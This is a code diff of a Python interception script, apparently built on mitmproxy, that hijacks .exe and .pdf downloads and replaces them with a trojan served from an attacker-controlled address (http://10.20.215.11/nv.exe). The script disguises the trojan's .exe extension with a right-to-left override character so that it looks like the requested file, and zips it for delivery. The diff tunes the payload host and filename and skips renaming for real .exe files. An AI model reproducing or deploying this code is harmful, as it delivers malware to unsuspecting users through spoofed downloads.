@@ -4,9 +4,9 @@ import os
 from Trojan import *
 
 
-IP = "10.20.215.8"
-TARGET_TEXTENSIONS = [".exe", ".pdf", ".txt"]
-EVIL_FILE = "http://10.20.215.8/evil.exe#"
+IP = "10.20.215.11"
+TARGET_TEXTENSIONS = [".exe", ".pdf"]
+EVIL_FILE = "http://10.20.215.11/nv.exe"
 WEB_ROOT = "/var/www/html/"
 SPOOF_EXTENSION = True
 
@@ -31,12 +31,13 @@ def request(flow):
 		if SPOOF_EXTENSION == True: 
 			print("[+] Renaming trojan to spoof its extension")
 			front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]
-			new_name = front_file_name + "‮" + "".join(reversed(front_file_extension))  + ".exe"
-			spoofed_file = WEB_ROOT + new_name
-			os.rename(trojan_file, spoofed_file)
-					
-			trojan.zip(spoofed_file)
-			download_file_name = front_file_name + ".zip"
+			if front_file_extension != "exe":
+				new_name = front_file_name + "‮" + "".join(reversed(front_file_extension))  + ".exe"
+				spoofed_file = WEB_ROOT + new_name
+				os.rename(trojan_file, spoofed_file)
+						
+				trojan.zip(spoofed_file)
+				download_file_name = front_file_name + ".zip"
 		
 		
 		torjan_download_url = "http://" + IP + "/" + download_file_name
